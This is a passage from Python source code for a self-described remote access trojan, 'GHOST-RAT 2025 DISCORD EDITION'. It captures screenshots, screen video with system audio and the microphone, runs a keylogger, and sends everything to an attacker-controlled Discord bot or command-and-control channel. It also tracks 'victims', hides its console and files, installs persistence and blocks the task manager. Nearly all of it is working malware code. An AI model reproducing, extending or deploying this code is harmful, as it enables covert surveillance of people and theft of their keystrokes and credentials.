                if i < count - 1:
                    time.sleep(0.3)
            
            # Send results
            if batch:
                if len(batch) == 1:
                    # Single screenshot - send directly
                    send_now(f"Screenshot captured", file_path=batch[0])
                else:
                    # Multiple screenshots - create zip
                    zip_path = os.path.join(tempfile.gettempdir(), f"screenshots_{count}_{int(time.time())}.zip")
                    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                        for f in batch:
                            z.write(f, os.path.basename(f))
                    send_now(f"Captured {len(batch)} screenshots", file_path=zip_path)
                
                # Cleanup individual files
                for f in batch:
                    try:
                        os.remove(f)
                    except:
                        pass
            else:
                send_now("No screenshots captured")
                
        except Exception as e:
            log(f"Screenshot burst error: {e}")
            send_now(f"Screenshot burst error: {e}")
        finally:
            RUN_SCREENSHOTS = False

    def video_with_system_audio(duration=30):
        """Record screen video with system audio for specified duration"""
        global RUN_VIDEO
        loopback_device = None
        
        log(f"Starting video recording for {duration} seconds")
        
        # Try to get loopback device for system audio (what's playing on speakers)
        try:
            import soundcard as sc
            # Try to find a loopback device
            all_speakers = sc.all_speakers()
            for sp in all_speakers:
                if 'loopback' in sp.name.lower() or 'stereo mix' in sp.name.lower():
                    loopback_device = sp
                    break
            
            if not loopback_device:
                # Try to get default loopback using correct API
                try:
                    # Check if there are any microphones that might be loopback
                    all_mics = sc.all_microphones()
                    for mic in all_mics:
                        if 'loopback' in mic.name.lower() or 'stereo mix' in mic.name.lower() or 'what u hear' in mic.name.lower():
                            loopback_device = mic
                            break
                except Exception:
                    pass
                    
            if loopback_device:
                send_now(f"System audio detected: {loopback_device.name}")
            else:
                send_now("System audio not available → video only")
                send_now("Tip: Enable 'Stereo Mix' in Windows Sound settings for audio capture")
        except Exception as e:
            send_now(f"soundcard error: {str(e)[:100]} → video only")
            send_now("To enable audio: Right-click sound icon → Sounds → Recording → Enable 'Stereo Mix'")
            log(f"soundcard init error: {e}")

        # Use MJPG codec for better Windows compatibility, fallback to others
        codecs_to_try = [
            ('MJPG', '.avi'),
            ('MP4V', '.avi'), 
            ('XVID', '.avi')
        ]
        
        fps = 10.0  # Reduced FPS for smaller files
        
        # Get actual screen capture size instead of system metrics
        try:
            test_img = ImageGrab.grab()
            # Reduce resolution for smaller files
            original_size = test_img.size
            # Scale down to max 1280x720 for better compression
            max_width, max_height = 1280, 720
            if original_size[0] > max_width or original_size[1] > max_height:
                ratio = min(max_width / original_size[0], max_height / original_size[1])
                size = (int(original_size[0] * ratio), int(original_size[1] * ratio))
                log(f"Scaled screen capture: {original_size} → {size}")
            else:
                size = original_size
            log(f"Video capture size: {size}")
        except Exception as e:
            size = (1280, 720)  # Fallback to smaller size
            log(f"Using fallback size: {size}, error: {e}")

        video_path = None
        out = None
        
        # Try different codecs until one works
        for codec_name, extension in codecs_to_try:
            try:
                fourcc = cv2.VideoWriter_fourcc(*codec_name)
                video_path = os.path.join(tempfile.gettempdir(), f"vid_{duration}s_{int(time.time())}{extension}")
                out = cv2.VideoWriter(video_path, fourcc, fps, size)
                
                if out.isOpened():
                    log(f"Video writer opened successfully with {codec_name} codec")
                    break
                else:
                    log(f"{codec_name} codec failed to open")
                    out = None
            except Exception as e:
                log(f"{codec_name} codec error: {e}")
                out = None

        if not out or not out.isOpened():
            send_now("Failed to open video writer with any codec")
            RUN_VIDEO = False
            return
        
        try:
            audio_frames = []
            start = time.time()
            audio_thread = None
            audio_stop = threading.Event()

            # Record audio in separate thread for better sync
            def record_audio():
                nonlocal audio_frames
                if not loopback_device:
                    return
                try:
                    import soundfile as sf
                    samplerate = 44100
                    chunk_duration = 0.1  # 100ms chunks
                    chunk_frames = int(samplerate * chunk_duration)
                    
                    while not audio_stop.is_set() and RUN_VIDEO and (time.time() - start) < duration:
                        try:
                            data = loopback_device.record(numframes=chunk_frames, samplerate=samplerate)
                            audio_frames.append(data)
                        except Exception as e:
                            log(f"Audio chunk error: {e}")
                            break
                except Exception as e:
                    log(f"Audio thread error: {e}")

            # Start audio recording thread
            if loopback_device:
                audio_thread = threading.Thread(target=record_audio, daemon=True)
                audio_thread.start()

            try:
                # Record video frames for specified duration
                frames_recorded = 0
                expected_size = size
                
                while RUN_VIDEO and (time.time() - start) < duration:
                    img = ImageGrab.grab()
                    frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                    
                    # Ensure frame matches expected size
                    if frame.shape[1] != expected_size[0] or frame.shape[0] != expected_size[1]:
                        frame = cv2.resize(frame, expected_size)
                    
                    success = out.write(frame)
                    # Note: OpenCV write() may return False even when successful on Windows
                    # So we don't break on write failure, just log it
                    if not success and frames_recorded < 5:  # Only warn for first few frames
                        log(f"Write returned False for frame {frames_recorded} (may be normal on Windows)")
                    
                    frames_recorded += 1
                    
                    # Progress update every 5 seconds
                    elapsed = time.time() - start
                    if frames_recorded % (fps * 5) == 0:
                        remaining = duration - elapsed
                        log(f"Video recording: {elapsed:.1f}s elapsed, {remaining:.1f}s remaining")
                    
                    time.sleep(1/fps)
                    
                log(f"Video recording completed: {frames_recorded} frames in {time.time() - start:.1f}s")
                    
            except Exception as e:
                send_now(f"Video record error: {str(e)[:200]}")
                log(f"video_record error: {e}")

            # Stop audio recording
            audio_stop.set()
            if audio_thread:
                audio_thread.join(timeout=2)
            out.release()
            
            # Verify the video file was created properly
            if not os.path.exists(video_path):
                send_now("Video file was not created")
                RUN_VIDEO = False
                return
                
            file_size = os.path.getsize(video_path)
            if file_size < 1000:  # Less than 1KB suggests no real content
                send_now(f"Video file too small ({file_size} bytes) - no frames captured")
                RUN_VIDEO = False
                return
                
            # Quick verification with OpenCV
            try:
                cap = cv2.VideoCapture(video_path)
                if cap.isOpened():
                    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
                    cap.release()
                    if frame_count == 0:
                        send_now("Video file contains no frames")
                        RUN_VIDEO = False
                        return
                    log(f"Video verification: {frame_count} frames, {file_size} bytes")
                else:
                    log("Could not verify video file with OpenCV")
            except Exception as e:
                log(f"Video verification error: {e}")

            # Process and convert to MP4
            try:
                final = video_path.replace(".avi", ".mp4")
                if audio_frames and loopback_device:
                    try:
                        import soundfile as sf
                        wav = video_path.replace(".avi", ".wav")
                        audio_data = np.concatenate(audio_frames)
                        sf.write(wav, audio_data, 44100)

                        cmd = (
                            f'ffmpeg -y -i "{video_path}" -i "{wav}" '
                            f'-c:v libx264 -c:a aac -preset fast -crf 23 -shortest "{final}" -loglevel error'
                        )
                        subprocess.run(
                            cmd, shell=True, creationflags=0x08000000, capture_output=True, timeout=120
                        )

                        if os.path.exists(final) and os.path.getsize(final) > 1000:
                            send_now(f"Video recorded ({duration}s with audio)", file_path=final)
                            try:
                                os.remove(video_path)
                                os.remove(wav)
                            except Exception:
                                pass
                        else:
                            send_now(f"Video recorded ({duration}s with audio)", file_path=video_path)
                            
                    except Exception as e:
                        log(f"Audio mux error: {e}")
                        cmd = (
                            f'ffmpeg -y -i "{video_path}" '
                            f'-c:v libx264 -preset fast -crf 23 "{final}" -loglevel error'
                        )
                        subprocess.run(
                            cmd, shell=True, creationflags=0x08000000, capture_output=True, timeout=60
                        )
                        if os.path.exists(final) and os.path.getsize(final) > 1000:
                            send_now(f"Video recorded ({duration}s with audio)", file_path=final)
                            try:
                                os.remove(video_path)
                            except Exception:
                                pass
                        else:
                            send_now(f"Video recorded ({duration}s with audio)", file_path=video_path)
                else:
                    # Video only (no audio)
                    cmd = (
                        f'ffmpeg -y -i "{video_path}" '
                        f'-c:v libx264 -preset fast -crf 23 "{final}" -loglevel error'
                    )
                    subprocess.run(
                        cmd, shell=True, creationflags=0x08000000, capture_output=True, timeout=120
                    )
                    if os.path.exists(final) and os.path.getsize(final) > 1000:
                        send_now(f"Video recorded ({duration}s video only)", file_path=final)
                        try:
                            os.remove(video_path)
                        except Exception:
                            pass
                    else:
                        send_now(f"Video recorded ({duration}s video only)", file_path=video_path)
                
            except Exception as e:
                send_now(f"Video processing error: {str(e)[:200]}")
                log(f"video_processing error: {e}")
                
        except Exception as e:
            send_now(f"Video recording error: {str(e)[:200]}")
            log(f"video_recording error: {e}")
        finally:
            RUN_VIDEO = False
            log(f"Video recording finished")

    def mic_loop():
        global RUN_MIC
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            send_now("Mic device ready")
        except Exception as e:
            send_now(f"Mic error: {str(e)[:200]}")
            log(f"mic_open error: {e}")
            return

        while RUN_MIC:
            frames = []
            try:
                for _ in range(0, int(44100 / 1024 * 30)):
                    if not RUN_MIC:
                        break
                    frames.append(stream.read(1024))
            except Exception as e:
                send_now(f"Mic read error: {str(e)[:200]}")
                log(f"mic_read error: {e}")
                break

            if frames:
                path = os.path.join(tempfile.gettempdir(), f"mic_{int(time.time())}.wav")
                wf = wave.open(path, 'wb')
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(44100)
                wf.writeframes(b''.join(frames))
                wf.close()
                send_now(file_path=path)

        stream.stop_stream()
        stream.close()
        p.terminate()

# ================= KEYLOGGER =================
if has_keylogger:
    _keylogger_listener = None

    def on_press(key):
        """Callback when a key is pressed"""
        global _keylogger_buffer
        try:
            with _keylogger_lock:
                # Format special keys
                if hasattr(key, 'char') and key.char:
                    # Regular character
                    _keylogger_buffer.append(key.char)
                elif key == keyboard.Key.space:
                    _keylogger_buffer.append(' ')
                elif key == keyboard.Key.enter:
                    _keylogger_buffer.append('\n')
                elif key == keyboard.Key.tab:
                    _keylogger_buffer.append('[TAB]')
                elif key == keyboard.Key.backspace:
                    _keylogger_buffer.append('[BACKSPACE]')
                elif key == keyboard.Key.delete:
                    _keylogger_buffer.append('[DEL]')
                elif key == keyboard.Key.esc:
                    _keylogger_buffer.append('[ESC]')
                elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
                    _keylogger_buffer.append('[SHIFT]')
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    _keylogger_buffer.append('[CTRL]')
                elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                    _keylogger_buffer.append('[ALT]')
                elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
                    _keylogger_buffer.append('[WIN]')
                else:
                    # Other special keys
                    _keylogger_buffer.append(f'[{str(key).replace("Key.", "")}]')
        except Exception as e:
            log(f"Keylogger on_press error: {e}")

    def keylogger_worker():
        """Keylogger main worker - sends logs periodically"""
        global RUN_KEYLOGGER, _keylogger_listener, _keylogger_buffer
        
        try:
            # Start the listener
            _keylogger_listener = keyboard.Listener(on_press=on_press)
            _keylogger_listener.start()
            send_now("Keylogger listener started")
            
            last_send_time = time.time()
            send_interval = 60  # Send every 60 seconds
            min_keys = 100  # Or when 100 keys are captured
            
            while RUN_KEYLOGGER:
                time.sleep(0.5)  # Reduced from 2s to 0.5s for faster keylog delivery
                
                current_time = time.time()
                should_send = False
                
                with _keylogger_lock:
                    key_count = len(_keylogger_buffer)
                    time_elapsed = current_time - last_send_time
                    
                    # Send if we have enough keys or enough time passed
                    if key_count >= min_keys or time_elapsed >= send_interval:
                        if key_count > 0:
                            should_send = True
                            keys_to_send = ''.join(_keylogger_buffer)
                            _keylogger_buffer.clear()
                
                if should_send:
                    # Format the log with timestamp
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    log_text = f"⌨️ KEYLOG [{timestamp}]\n{keys_to_send}"
                    
                    # Split if too long (platform limit is ~4096 chars)
                    if len(log_text) > 4000:
                        # Send in chunks
                        chunks = [log_text[i:i+4000] for i in range(0, len(log_text), 4000)]
                        for chunk in chunks:
                            send_now(chunk)
                    else:
                        send_now(log_text)
                    
                    last_send_time = current_time
                    
        except Exception as e:
            send_now(f"Keylogger error: {str(e)[:200]}")
            log(f"keylogger_worker error: {e}")
        finally:
            # Stop listener
            if _keylogger_listener:
                try:
                    _keylogger_listener.stop()
                except:
                    pass
            # Send any remaining keys
            with _keylogger_lock:
                if _keylogger_buffer:
                    remaining = ''.join(_keylogger_buffer)
                    if remaining:
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        send_now(f"⌨️ KEYLOG [FINAL - {timestamp}]\n{remaining}")
                    _keylogger_buffer.clear()


def save_victim_data():
    """Persist victim tags/display names to a small temp file so they survive reboot."""
    try:
        data = {"tags": VICTIM_TAGS, "names": VICTIM_DISPLAY_NAME}
        with open(os.path.join(tempfile.gettempdir(), "ghost_data.pkl"), "wb") as f:
            pickle.dump(data, f)
    except:
        pass


def load_victim_data():
    """Load victim tags/display names from the temp file if present."""
    global VICTIM_TAGS, VICTIM_DISPLAY_NAME
    try:
        path = os.path.join(tempfile.gettempdir(), "ghost_data.pkl")
        if os.path.exists(path):
            with open(path, "rb") as f:
                data = pickle.load(f) 
                VICTIM_TAGS = data.get("tags", {}) or {}
                VICTIM_DISPLAY_NAME = data.get("names", {}) or {}
    except:
        pass

def has_connected_before():
    """Check if this victim has connected before (first connection detection)."""
    try:
        # Use a file per victim ID to track first connection
        flag_file = os.path.join(tempfile.gettempdir(), f"ghost_connected_{VICTIM_ID}.flag")
        return os.path.exists(flag_file)
    except:
        return False

def mark_as_connected():
    """Mark this victim as having connected (prevents future first-connection notifications)."""
    try:
        flag_file = os.path.join(tempfile.gettempdir(), f"ghost_connected_{VICTIM_ID}.flag")
        with open(flag_file, "w") as f:
            f.write(str(time.time()))  # Store timestamp
        # Hide the file
        try:
            ctypes.windll.kernel32.SetFileAttributesW(flag_file, 0x02)  # FILE_ATTRIBUTE_HIDDEN
        except:
            pass
    except:
        pass
# ================= MAIN =================
if __name__ == "__main__":
    # Initialize logging first
    log("=" * 60, also_print=True)
    log("GHOST-RAT 2025 DISCORD EDITION - STARTING", also_print=True)
    log(f"Log file location: {LOG_PATH}", also_print=True)
    log(f"Monitor file location: {DESKTOP_LOG}", also_print=True)
    log("=" * 60, also_print=True)
    
    # HIDE CONSOLE WINDOW IMMEDIATELY - First thing we do
    # This ensures no window appears when running as .py or .exe
    hide_console_window()
    log("[STARTUP] Console window hidden")
    
    # ENFORCE SINGLETON: Only one instance can run at a time
    # This prevents multiple instances from running after reboot or /admin
    if not enforce_singleton():
        log("[STARTUP] ⚠️ Singleton enforcement failed, but continuing anyway", also_print=True)
    else:
        log("[STARTUP] ✅ Singleton check passed")
    
    load_victim_data()
    log("[STARTUP] ✅ Victim data loaded")

    try:
        # Add persistence and stealth features
        add_persistence()
        log("[STARTUP] ✅ Persistence installed")
        hide_from_taskmanager()
        log("[STARTUP] ✅ Task manager blocker started")
    except Exception as e:
        log(f"[STARTUP] ❌ Error in stealth features: {e}", also_print=True)

    if USE_QUICK_C2:
        log("[STARTUP] Using quick_c2 transport (no Discord)", also_print=True)
        try:
            run_quick_c2_client()
        except Exception as e:
            log(f"[STARTUP] ❌ CRITICAL: quick_c2 client crashed: {e}", also_print=True)
    else:
        # Start Discord bot (runs in background, no window)
        log("[STARTUP] 🔄 Attempting to connect to Discord...", also_print=True)
        try:
            bot.run(DISCORD_TOKEN)
        except Exception as e:
            log(f"[STARTUP] ❌ CRITICAL: Failed to start bot: {e}", also_print=True)
            import traceback
            log(f"[STARTUP] Traceback: {traceback.format_exc()}", also_print=True)
